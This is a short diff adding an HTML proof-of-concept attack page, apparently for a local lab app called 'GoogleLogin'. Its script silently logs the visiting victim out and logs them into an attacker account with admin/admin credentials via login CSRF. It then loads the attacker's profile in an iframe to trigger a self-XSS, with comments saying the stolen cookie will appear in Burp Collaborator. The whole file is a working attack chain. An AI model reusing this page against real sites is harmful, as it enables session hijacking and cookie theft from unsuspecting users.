@@ -1,0 +1,17 @@
+<!--Victim will click this-->
+<!DOCTYPE html>
+<html>
+<body>
+	<h1>Cookie will be shown in Burp Collaborator</h1>
+	<script type="text/javascript">
+		//Log out victim's session
+		navigator.sendBeacon("http://localhost/GoogleLogin/logout.php","");
+		//Log in to attacker account
+		navigator.sendBeacon("http://localhost/GoogleLogin/authLocal.php", new Blob(["username=admin&password=admin"], { type: "application/x-www-form-urlencoded" }))
+		 //Open attacker profile to execute  to execute Self XSS 
+		 var profileIframe2 = document.createElement('iframe');
+		 profileIframe2.setAttribute('src', 'http://localhost/GoogleLogin/index.php');
+		 document.body.appendChild(profileIframe2);
+	</script>	
+</body>
+</html>
